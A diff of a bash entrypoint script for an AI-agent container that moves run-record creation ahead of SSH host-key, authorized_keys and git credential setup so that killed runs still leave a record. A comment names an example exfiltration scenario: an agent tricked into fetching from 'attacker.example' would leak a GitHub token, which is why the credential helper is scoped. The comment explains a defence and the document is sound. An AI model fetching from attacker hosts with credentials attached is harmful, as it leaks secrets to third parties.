@@ -3,12 +3,12 @@
 #
 # Responsibilities (in order):
 #   1. Validate required env vars (fail fast, never log their values).
+#   1r. Open this run's record on the 'runs' volume (Feature 016) — written at
+#      START, and FIRST, so a run that is KILLED still leaves one; completed on
+#      every exit path this script can still reach.
 #   2. Install/persist/generate the SSH host key + assemble authorized_keys
 #      (from bind-mount, env, or the persisted ~/.ssh volume) as the dev user.
 #   3. Configure git identity + HTTPS credential helper for the dev user.
-#   3r. Open this run's record on the 'runs' volume (Feature 016) — written at
-#      START so a run that is KILLED still leaves one, completed on every exit
-#      path this script can still reach.
 #   3e. Take the repository baseline once the workspace is populated, so the
 #      record can state what the run committed and whether it pushed.
 #   4. Start sshd in the background.
@@ -66,123 +66,14 @@ for opt in ANTHROPIC_API_KEY OPENAI_API_KEY; do
     fi
 done
 
-# --- 1b. Seed persistent shell-env template ---------------------------------
-# /home/dev/.agent-env lives on the per-container 'shellenv' named volume and is
-# (Feature 011) named for what it IS — the persistent shell environment — rather
-# than sharing a name with the project config directory it has nothing to do with.
-# sourced into every interactive bash/zsh shell (see Dockerfile). On first boot
-# the volume is empty, so drop a commented template explaining its purpose.
-# Idempotent: never overwrite an existing file, and never echo its contents.
-# Home base is /home/dev in the image (deliberately hardcoded, not $HOME, since
-# the runtime may not export HOME for the non-root user). AGENT_CONTAINER_HOME lets the
-# off-container test harness redirect this one path; production leaves it unset
-# so the default is byte-identical to the previous behavior.
-AGENT_CONTAINER_HOME="${AGENT_CONTAINER_HOME:-/home/dev}"
-AGENT_CONTAINER_ENV_FILE="${AGENT_CONTAINER_HOME}/.agent-env/env"
-if [[ ! -f "${AGENT_CONTAINER_ENV_FILE}" ]]; then
-    log "seeding persistent shell-env template at ${AGENT_CONTAINER_ENV_FILE}"
-    mkdir -p "${AGENT_CONTAINER_HOME}/.agent-env"
-    cat > "${AGENT_CONTAINER_ENV_FILE}" <<'EOF'
-# ~/.agent-env/env — persistent shell environment for this agent-container container.
-#
-# This file lives on the per-container 'shellenv' named volume, so it survives
-# `agent-container down` / `agent-container up` and crashes (it is dropped only by `down --purge`).
-# It is sourced with `set -a` into every interactive bash and zsh shell,
-# including tmux panes. Keep it to simple KEY=VALUE / export lines.
-#
-# Example:
-#   export FOO=bar
-EOF
-else
-    log "persistent shell-env file already present, leaving it alone"
-fi
-
-# --- 2. SSH host key (rootless: dev-owned, on the persisted ~/.ssh volume) ---
-# The host key lives in ~/.ssh/hostkeys (a per-container named volume), so a
-# container keeps a STABLE identity across down/up while different containers
-# differ. Generated as the dev user — no root. ssh-keygen -A cannot target a
-# custom dir, so we generate the single ed25519 key explicitly. Idempotent:
-# only generate if absent (a persisted or injected key is left untouched).
-SSH_DIR="${AGENT_CONTAINER_HOME}/.ssh"
-HOSTKEY_DIR="${SSH_DIR}/hostkeys"
-HOSTKEY="${HOSTKEY_DIR}/ssh_host_ed25519_key"
-mkdir -p "${HOSTKEY_DIR}"
-chmod 0700 "${SSH_DIR}" "${HOSTKEY_DIR}"
-
-# Host-key source precedence (highest first). A container adopts an operator-
-# supplied identity if given, else keeps its persisted one, else generates:
-#   1. bind-mounted file at /run/agent-container/ssh_host_ed25519_key (`up --host-key`)
-#   2. SSH_HOST_ED25519_KEY_B64 env var (base64 of the private key; env-file channel)
-#   3. already-persisted key on the ~/.ssh volume
-#   4. freshly generated ed25519 key
-# INJECT_DIR is where `up --host-key/--authorized-key` bind-mounts the key
-# files. AGENT_CONTAINER_INJECT_DIR lets the off-container test harness redirect
-# it; production leaves it unset so the default is the real bind-mount path.
+# INJECT_DIR is where the CLI bind-mounts the per-boot files: the SSH host key
+# and authorized_keys (section 2) and the headless task (section 1r, just below,
+# which is why this is resolved here rather than beside its first reader).
+# AGENT_CONTAINER_INJECT_DIR lets the off-container test harness redirect it;
+# production leaves it unset so the default is the real bind-mount path.
 INJECT_DIR="${AGENT_CONTAINER_INJECT_DIR:-/run/agent-container}"
-if [[ -f "${INJECT_DIR}/ssh_host_ed25519_key" ]]; then
-    log "installing bind-mounted SSH host key"
-    install -m 0600 "${INJECT_DIR}/ssh_host_ed25519_key" "${HOSTKEY}"
-elif [[ -n "${SSH_HOST_ED25519_KEY_B64:-}" ]]; then
-    log "installing SSH host key from SSH_HOST_ED25519_KEY_B64"
-    printf '%s' "${SSH_HOST_ED25519_KEY_B64}" | base64 -d > "${HOSTKEY}"
-    chmod 0600 "${HOSTKEY}"
-elif [[ ! -f "${HOSTKEY}" ]]; then
-    log "generating SSH host key (ed25519) at ${HOSTKEY}"
-    ssh-keygen -q -t ed25519 -f "${HOSTKEY}" -N ''
-else
-    log "SSH host key already present, skipping generation"
-fi
-# Validate the key and (re)derive its public half. A bad injected key fails fast
-# here rather than as an opaque sshd startup error.
-if ! ssh-keygen -y -f "${HOSTKEY}" > "${HOSTKEY}.pub" 2>/dev/null; then
-    die "SSH host key at ${HOSTKEY} is missing or invalid"
-fi
-chmod 0600 "${HOSTKEY}"
-chmod 0644 "${HOSTKEY}.pub"
 
-# --- 2b. authorized_keys: union of persisted + injected sources, deduped -----
-# Non-secret (public keys). Sources: the persisted file, a bind-mounted file
-# (`up --authorized-key`), and the SSH_AUTHORIZED_KEYS env var. Deduped so
-# repeated boots and overlapping sources don't accumulate duplicates.
-AUTHKEYS="${SSH_DIR}/authorized_keys"
-_akt="$(mktemp)"
-[[ -f "${AUTHKEYS}" ]] && cat "${AUTHKEYS}" >> "${_akt}"
-[[ -f "${INJECT_DIR}/authorized_keys" ]] && cat "${INJECT_DIR}/authorized_keys" >> "${_akt}"
-[[ -n "${SSH_AUTHORIZED_KEYS:-}" ]] && printf '%s\n' "${SSH_AUTHORIZED_KEYS}" >> "${_akt}"
-if [[ -s "${_akt}" ]]; then
-    awk 'NF && !seen[$0]++' "${_akt}" > "${AUTHKEYS}"
-    chmod 0600 "${AUTHKEYS}"
-    log "authorized_keys assembled ($(grep -c . "${AUTHKEYS}") key(s))"
-fi
-rm -f "${_akt}"
-
-# sshd's privilege-separation directory (/run/sshd) is created root-owned at
-# build time; a rootless sshd only needs it to exist, not to write to it.
-
-# --- 3. Git identity + credential helper ------------------------------------
-# Identity is non-secret; logging the name is fine. Email is also non-secret
-# but we still don't echo it — keep the log surface minimal.
-git config --global user.name "${GIT_USER_NAME}"
-git config --global user.email "${GIT_USER_EMAIL}"
-git config --global init.defaultBranch main
-git config --global pull.rebase false
-
-# Credential helper as a shell function. Single quotes are CRITICAL: the body
-# is stored VERBATIM in ~/.gitconfig, so ${GH_TOKEN} is expanded by the helper
-# shell at git-push time from the process env — not by this script now. The
-# token is never written to disk in the container.
-#
-# SCOPED to https://github.com deliberately. A GLOBAL credential.helper would
-# hand ${GH_TOKEN} to git for ANY https host it authenticates against — so an
-# autonomous agent tricked into `git fetch https://attacker.example/repo` would
-# leak the GitHub token to that host as Basic auth. The URL-scoped key only fires
-# for github.com; no global helper is set, so other hosts get no credential at all.
-git config --global credential.https://github.com.helper \
-    '!f() { echo "username=x-access-token"; echo "password=${GH_TOKEN}"; }; f'
-
-log "Configured git identity for ${GIT_USER_NAME}"
-
-# --- 3r. Run record — open it at START (Feature 016) -------------------------
+# --- 1r. Run record — open it at START, before anything else (Feature 016) ---
 # Every run leaves a small durable JSON record that outlives its container. The
 # CONTAINER writes it because a DETACHED headless run — the default headless
 # mode — ends with no CLI attached: the entrypoint is the only thing present at
@@ -195,9 +86,22 @@ log "Configured git identity for ${GIT_USER_NAME}"
 # emitted solely at exit would lose exactly the abnormally-ended runs an operator
 # goes looking for, and would lose them silently.
 #
-# It sits BEFORE the credential/config/clone sections rather than after them
-# because clone-on-start (3d) can `die`: a container that started, failed to set
-# itself up, and was then torn down would otherwise leave no account at all.
+# IT RUNS FIRST — before the shell-env seed, the SSH host key and the git
+# identity — because a container is KILLABLE from the instant the runtime marks
+# it `Up`, which is before this script has executed a line. Anything placed ahead
+# of this section is time in which a SIGKILL leaves NO record at all: not a run
+# with an unknown ending, but a run `runs list` cannot say ever happened, which
+# is the one failure an operator cannot even detect. Measured on an idle Linux
+# host: the steps that used to precede it cost 20-60ms, this section itself costs
+# 100-440ms, and bash's own startup — which nothing here can remove — costs
+# 80-350ms before that. So ordering shrinks the window; it does not close it, and
+# a container killed in the first fraction of a second still has no run to
+# record. Nothing may be added above this line without paying for it in runs lost
+# without a trace.
+#
+# Running first also covers what the original placement was reaching for: every
+# `die` below — an invalid injected host key (2), clone-on-start (3d) — now
+# leaves an account of the container that started and failed to set itself up.
 #
 # Ordering inside this section is deliberate: state, then encoders, then the
 # repository capture, then the writer, then the exit paths, then the single call
@@ -823,6 +727,119 @@ runs_start() {
 
 runs_safely runs_start
 
+
+# --- 1b. Seed persistent shell-env template ---------------------------------
+# /home/dev/.agent-env lives on the per-container 'shellenv' named volume and is
+# (Feature 011) named for what it IS — the persistent shell environment — rather
+# than sharing a name with the project config directory it has nothing to do with.
+# sourced into every interactive bash/zsh shell (see Dockerfile). On first boot
+# the volume is empty, so drop a commented template explaining its purpose.
+# Idempotent: never overwrite an existing file, and never echo its contents.
+# Home base is /home/dev in the image (deliberately hardcoded, not $HOME, since
+# the runtime may not export HOME for the non-root user). AGENT_CONTAINER_HOME lets the
+# off-container test harness redirect this one path; production leaves it unset
+# so the default is byte-identical to the previous behavior.
+AGENT_CONTAINER_HOME="${AGENT_CONTAINER_HOME:-/home/dev}"
+AGENT_CONTAINER_ENV_FILE="${AGENT_CONTAINER_HOME}/.agent-env/env"
+if [[ ! -f "${AGENT_CONTAINER_ENV_FILE}" ]]; then
+    log "seeding persistent shell-env template at ${AGENT_CONTAINER_ENV_FILE}"
+    mkdir -p "${AGENT_CONTAINER_HOME}/.agent-env"
+    cat > "${AGENT_CONTAINER_ENV_FILE}" <<'EOF'
+# ~/.agent-env/env — persistent shell environment for this agent-container container.
+#
+# This file lives on the per-container 'shellenv' named volume, so it survives
+# `agent-container down` / `agent-container up` and crashes (it is dropped only by `down --purge`).
+# It is sourced with `set -a` into every interactive bash and zsh shell,
+# including tmux panes. Keep it to simple KEY=VALUE / export lines.
+#
+# Example:
+#   export FOO=bar
+EOF
+else
+    log "persistent shell-env file already present, leaving it alone"
+fi
+
+# --- 2. SSH host key (rootless: dev-owned, on the persisted ~/.ssh volume) ---
+# The host key lives in ~/.ssh/hostkeys (a per-container named volume), so a
+# container keeps a STABLE identity across down/up while different containers
+# differ. Generated as the dev user — no root. ssh-keygen -A cannot target a
+# custom dir, so we generate the single ed25519 key explicitly. Idempotent:
+# only generate if absent (a persisted or injected key is left untouched).
+SSH_DIR="${AGENT_CONTAINER_HOME}/.ssh"
+HOSTKEY_DIR="${SSH_DIR}/hostkeys"
+HOSTKEY="${HOSTKEY_DIR}/ssh_host_ed25519_key"
+mkdir -p "${HOSTKEY_DIR}"
+chmod 0700 "${SSH_DIR}" "${HOSTKEY_DIR}"
+
+# Host-key source precedence (highest first). A container adopts an operator-
+# supplied identity if given, else keeps its persisted one, else generates:
+#   1. bind-mounted file at /run/agent-container/ssh_host_ed25519_key (`up --host-key`)
+#   2. SSH_HOST_ED25519_KEY_B64 env var (base64 of the private key; env-file channel)
+#   3. already-persisted key on the ~/.ssh volume
+#   4. freshly generated ed25519 key
+if [[ -f "${INJECT_DIR}/ssh_host_ed25519_key" ]]; then
+    log "installing bind-mounted SSH host key"
+    install -m 0600 "${INJECT_DIR}/ssh_host_ed25519_key" "${HOSTKEY}"
+elif [[ -n "${SSH_HOST_ED25519_KEY_B64:-}" ]]; then
+    log "installing SSH host key from SSH_HOST_ED25519_KEY_B64"
+    printf '%s' "${SSH_HOST_ED25519_KEY_B64}" | base64 -d > "${HOSTKEY}"
+    chmod 0600 "${HOSTKEY}"
+elif [[ ! -f "${HOSTKEY}" ]]; then
+    log "generating SSH host key (ed25519) at ${HOSTKEY}"
+    ssh-keygen -q -t ed25519 -f "${HOSTKEY}" -N ''
+else
+    log "SSH host key already present, skipping generation"
+fi
+# Validate the key and (re)derive its public half. A bad injected key fails fast
+# here rather than as an opaque sshd startup error.
+if ! ssh-keygen -y -f "${HOSTKEY}" > "${HOSTKEY}.pub" 2>/dev/null; then
+    die "SSH host key at ${HOSTKEY} is missing or invalid"
+fi
+chmod 0600 "${HOSTKEY}"
+chmod 0644 "${HOSTKEY}.pub"
+
+# --- 2b. authorized_keys: union of persisted + injected sources, deduped -----
+# Non-secret (public keys). Sources: the persisted file, a bind-mounted file
+# (`up --authorized-key`), and the SSH_AUTHORIZED_KEYS env var. Deduped so
+# repeated boots and overlapping sources don't accumulate duplicates.
+AUTHKEYS="${SSH_DIR}/authorized_keys"
+_akt="$(mktemp)"
+[[ -f "${AUTHKEYS}" ]] && cat "${AUTHKEYS}" >> "${_akt}"
+[[ -f "${INJECT_DIR}/authorized_keys" ]] && cat "${INJECT_DIR}/authorized_keys" >> "${_akt}"
+[[ -n "${SSH_AUTHORIZED_KEYS:-}" ]] && printf '%s\n' "${SSH_AUTHORIZED_KEYS}" >> "${_akt}"
+if [[ -s "${_akt}" ]]; then
+    awk 'NF && !seen[$0]++' "${_akt}" > "${AUTHKEYS}"
+    chmod 0600 "${AUTHKEYS}"
+    log "authorized_keys assembled ($(grep -c . "${AUTHKEYS}") key(s))"
+fi
+rm -f "${_akt}"
+
+# sshd's privilege-separation directory (/run/sshd) is created root-owned at
+# build time; a rootless sshd only needs it to exist, not to write to it.
+
+# --- 3. Git identity + credential helper ------------------------------------
+# Identity is non-secret; logging the name is fine. Email is also non-secret
+# but we still don't echo it — keep the log surface minimal.
+git config --global user.name "${GIT_USER_NAME}"
+git config --global user.email "${GIT_USER_EMAIL}"
+git config --global init.defaultBranch main
+git config --global pull.rebase false
+
+# Credential helper as a shell function. Single quotes are CRITICAL: the body
+# is stored VERBATIM in ~/.gitconfig, so ${GH_TOKEN} is expanded by the helper
+# shell at git-push time from the process env — not by this script now. The
+# token is never written to disk in the container.
+#
+# SCOPED to https://github.com deliberately. A GLOBAL credential.helper would
+# hand ${GH_TOKEN} to git for ANY https host it authenticates against — so an
+# autonomous agent tricked into `git fetch https://attacker.example/repo` would
+# leak the GitHub token to that host as Basic auth. The URL-scoped key only fires
+# for github.com; no global helper is set, so other hosts get no credential at all.
+git config --global credential.https://github.com.helper \
+    '!f() { echo "username=x-access-token"; echo "password=${GH_TOKEN}"; }; f'
+
+log "Configured git identity for ${GIT_USER_NAME}"
+
 # --- 3a. Canonical agent config (Feature 003, US3) --------------------------
 # Operator-canonical agent config is delivered FRESH each boot as ephemeral
 # compose configs mirrored under ${INJECT_DIR}/config/<home-relative-path> (e.g.
@@ -1076,9 +1093,10 @@ runs_safely runs_repo_capture_start
 
 # --- Feature 004: execution mode + per-agent invocation ---------------------
 # AGENT_CONTAINER_MODE, AGENT_CONTAINER_AGENT and TASK_FILE are resolved in
-# section 3r, which needs them to open the run record before clone-on-start can
-# `die`. They are read, not re-defaulted, here — a second `:-` default is a
-# second answer, and the record would eventually name an agent that did not run.
+# section 1r, which needs them to open the run record before anything below can
+# `die` or be killed. They are read, not re-defaulted, here — a second `:-`
+# default is a second answer, and the record would eventually name an agent that
+# did not run.
 
 # Feature 010 FR-012: fail CLEARLY when the selected agent is not in this image
 # (an image built before the agent was added). Without this the failure surfaces
